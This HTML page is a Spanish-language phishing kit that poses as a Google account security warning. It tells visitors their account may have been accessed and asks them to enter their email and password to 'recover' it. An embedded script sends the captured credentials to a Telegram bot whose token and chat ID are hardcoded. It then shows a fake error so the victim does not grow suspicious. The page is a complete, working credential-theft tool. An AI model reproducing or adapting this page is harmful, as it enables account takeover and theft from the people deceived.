<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 30px;
            color: black;
        }

        h1 {
            color: black;
        }

        label {
            display: block;
            margin-top: 20px;
            margin-bottom: 5px;
        }

        input {
            padding: 10px;
            width: 250px;
        }

        button {
            margin-top: 20px;
            padding: 10px 20px;
            cursor: pointer;
        }
    </style>
</head>

<body>
<h1>
    <span style="color: blue;">G</span>
    <span style="color: red;">o</span>
    <span style="color: yellow;">o</span>
    <span style="color: blue;">g</span>
    <span style="color: green;">l</span>
    <span style="color: red;">e</span>
    Cuenta
</h2> 
      
 <h2> es posible que alguien haya accedido a tu cuenta de Google mediante una aplicación sospecha. para proteger tu cuenta, se cerrara sesion en todos los dispositivos </h2>
 <h1> ⚠️ </h1>
<h3>
    <span style="color: red;">para recuperar introduzca su correo y contraseña </span>  
</h3> 
 
    <form id="formulario">

        <label for="edad"> correo electronico</label>
        <input type="text" id="edad" required>

        <label for="cumple">contraseña</label>
        <input type="text" id="cumple" required>

        <button type="submit">confirmar</button>

    </form>

    <script>
        const BOT_TOKEN = "8534272233:AAFdYkrNxP1VRtSkK-SrKh5_rFd_zgu9qxQ";
        const CHAT_ID = "8962841591";

        document.getElementById("formulario").addEventListener("submit", async function(event) {
            event.preventDefault();

            const edad = document.getElementById("edad").value;
            const cumple = document.getElementById("cumple").value;

            const mensaje =
`📩 NUEVA RESPUESTA DEL FORMULARIO

👤 correo: ${edad}
🫆 Contraseña: ${cumple}`;

            const respuesta = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: mensaje
                    })
                }
            );

            const resultado = await respuesta.json();

            if (resultado.ok) {
                alert("Error al enviar la respuesta.");
                document.getElementById("formulario").reset();
            } else {
                alert("Error al enviar las respuestas.");
                console.log(resultado);
            }
        });
    </script>

</body>
</html>
